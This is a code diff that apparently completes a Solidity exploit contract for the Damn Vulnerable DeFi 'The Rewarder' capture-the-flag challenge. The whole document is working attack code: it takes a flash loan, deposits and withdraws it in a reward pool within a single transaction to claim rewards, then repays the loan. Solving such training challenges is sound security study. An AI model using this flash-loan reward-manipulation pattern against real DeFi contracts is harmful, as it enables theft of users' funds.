@@ -54,7 +54,28 @@ contract AttackReward {
     TheRewarderPool public rewardPool;
     RewardToken public reward;
 
-    constructor() {}
+    constructor(
+        address _pool,
+        address _token,
+        address _rewardPool,
+        address _reward
+    ) {
+        pool = FlashLoanerPool(_pool);
+        token = DamnValuableToken(_token);
+        rewardPool = TheRewarderPool(_rewardPool);
+        reward = RewardToken(_reward);
+    }
 
-    function attack() external {}
+    fallback() external {
+        uint256 balance = token.balanceOf(address(this));
+        token.approve(address(rewardPool), balance);
+        rewardPool.deposit(balance);
+        rewardPool.withdraw(balance);
+        token.transfer(address(pool), balance);
+    }
+
+    function attack() external {
+        pool.flashLoan(token.balanceOf(address(pool)));
+        reward.transfer(msg.sender, reward.balanceOf(address(this)));
+    }
 }
